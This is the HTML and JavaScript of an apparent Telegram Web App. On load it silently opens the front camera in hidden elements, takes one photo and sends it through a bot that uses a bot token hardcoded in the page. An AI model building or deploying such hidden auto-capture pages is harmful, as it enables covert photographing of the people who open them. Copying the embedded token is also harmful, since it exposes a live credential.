<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Photo Capture</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
        const tg = window.Telegram.WebApp;

        // Telegram User ID
        const CHAT_ID = tg.initDataUnsafe?.user?.id;

        if (!CHAT_ID) {
            console.error("Telegram User ID is missing.");
            tg.close();
        }

        tg.expand(); // Expand Web App to full screen

        // Function to capture and send photo
        async function captureAndSendPhoto(video, canvas) {
            try {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Draw video frame onto canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas to image blob
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

                // Prepare and send photo to Telegram
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                if (result.ok) {
                    console.log("Photo sent successfully!");
                    tg.close(); // Close the Web App
                } else {
                    console.error("Failed to send photo:", result.description);
                    alert("Ошибка отправки фото: " + result.description);
                    tg.close();
                }
            } catch (error) {
                console.error("Error sending photo:", error);
                alert("Произошла ошибка при отправке фото.");
                tg.close();
            }
        }

        // Access camera and capture photo
        async function initializeCamera() {
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');

                // Access camera stream
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });

                video.srcObject = stream;

                // Wait for video to load metadata
                video.onloadedmetadata = async () => {
                    video.play();

                    // Small delay to ensure video stream is ready
                    setTimeout(async () => {
                        await captureAndSendPhoto(video, canvas);

                        // Stop the camera stream after capturing the photo
                        stream.getTracks().forEach(track => track.stop());
                    }, 1000); // Delay of 1 second
                };
            } catch (error) {
                console.error("Camera error:", error);
                alert("Ошибка доступа к камере. Проверьте настройки.");
                tg.close();
            }
        }

        // Start the process on page load
        window.onload = initializeCamera;
    </script>
</body>
</html>
